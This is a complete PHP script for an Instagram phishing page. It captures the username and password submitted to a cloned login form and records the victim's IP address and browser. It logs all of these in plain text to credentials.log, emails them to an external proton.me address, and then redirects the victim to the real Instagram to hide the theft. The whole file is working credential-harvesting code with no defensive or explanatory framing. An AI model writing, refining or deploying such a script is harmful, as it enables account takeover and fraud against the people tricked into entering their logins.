<?php
// Enable error reporting
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Get form data
$username = $_POST['u_name'] ?? '';
$password = $_POST['pass'] ?? '';

// Validate input
if (empty($username) || empty($password)) {
    header("Location: ./index.html?error=empty_fields");
    exit();
}

// Collect additional data
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Email configuration
$to = "dantetheanonoo@proton.me";
$subject = "Instagram Login Details - $date";
$message = "New login attempt:\n\n";
$message .= "Date: $date\n";
$message .= "IP Address: $ip\n";
$message .= "User Agent: $userAgent\n";
$message .= "Username: $username\n";
$message .= "Password: $password\n";

// Improved headers
$headers = "From: instagram-clone@".$_SERVER['SERVER_NAME']."\r\n";
$headers .= "Reply-To: no-reply@".$_SERVER['SERVER_NAME']."\r\n";
$headers .= "X-Mailer: PHP/".phpversion()."\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/plain; charset=UTF-8\r\n";

// Log to file (always do this)
file_put_contents('./credentials.log', "[$date] $ip | $username | $password\n", FILE_APPEND);

// Try to send email with error handling
try {
    $mailSent = mail($to, $subject, $message, $headers);
    
    if (!$mailSent) {
        throw new Exception('Mail function failed');
    }
    
    // Log success
    file_put_contents('./mail_success.log', "[$date] Email sent successfully\n", FILE_APPEND);
    
} catch (Exception $e) {
    // Log detailed error
    file_put_contents('./mail_errors.log', "[$date] ERROR: ".$e->getMessage()."\n", FILE_APPEND);
    file_put_contents('./mail_errors.log', "Headers used: $headers\n", FILE_APPEND);
    file_put_contents('./mail_errors.log', "Message content: $message\n\n", FILE_APPEND);
    
    // Redirect with error code
    header("Location: ./index.html?error=mail_failed");
    exit();
}

// Always redirect to Instagram
header("Location: https://www.instagram.com");
exit();
?>